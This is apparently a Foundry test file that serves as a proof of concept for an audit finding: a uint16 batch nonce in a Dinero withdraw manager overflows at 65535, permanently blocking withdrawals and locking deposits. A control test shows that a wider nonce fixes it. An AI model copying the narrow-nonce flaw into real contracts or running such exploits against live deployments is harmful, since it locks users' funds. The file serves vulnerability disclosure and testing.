// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    PxETH,
    UpxETH,
    PirexETHMock,
    DineroWithdrawRequestManager,
    DineroFixed,
    StuckMarker
} from "./62487-h-6-dos-might-happen-to-dinerowithdrawrequestmanager-initi.sol";

// Notional Exponent H-6: `uint256 nonce = ++s_batchNonce` on a `uint16 s_batchNonce`
// reverts on overflow at 65535 → initiateWithdraw is permanently bricked and deposited
// assets are locked forever.
contract PoC_62487_DineroNonceOverflow is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant DEPOSIT = 50 ether;
    uint16 internal constant NONCE_MAX = 65535;

    function test_nonceOverflow_bricksWithdrawals() public {
        Exploit exp = new Exploit();
        exp.run();

        DineroWithdrawRequestManager manager = exp.manager();
        StuckMarker stuck = exp.stuck();

        // The nonce is pinned at its uint16 max; a direct withdrawal still reverts on ++overflow.
        vm.expectRevert(); // arithmetic overflow on ++s_batchNonce
        manager.initiateWithdraw(DEPOSIT);

        emit log_named_uint("s_batchNonce (uint16 max)", manager.batchNonce());
        emit log_named_decimal_uint("pxETH locked (un-withdrawable)", stuck.balanceOf(SINK), 18);

        assertEq(manager.batchNonce(), NONCE_MAX, "nonce should be at its uint16 max");
        // The staked deposit is permanently locked because withdrawals revert.
        assertEq(stuck.balanceOf(SINK), DEPOSIT, "locked deposit mismatch");
    }

    // Control: a uint256 nonce does not overflow at 65535, so withdrawals keep working.
    function test_control_wideNonce_withdrawSucceeds() public {
        PxETH px = new PxETH();
        UpxETH up = new UpxETH();
        PirexETHMock pirex = new PirexETHMock(px, up);
        DineroFixed mgr = new DineroFixed(pirex, px);

        px.mint(address(mgr), DEPOSIT);
        mgr._forceBatchNonce(NONCE_MAX); // same 65535 point that bricks the uint16 version

        // The DoS is a REVERT on ++ overflow; a wide nonce removes it, so this must NOT revert.
        uint256 requestId = mgr.initiateWithdraw(DEPOSIT);
        emit log_named_uint("fixed requestId (no revert past 65535)", requestId);

        assertGt(requestId, 0, "fixed withdrawal must succeed past 65535 (no ++ overflow revert)");
    }
}
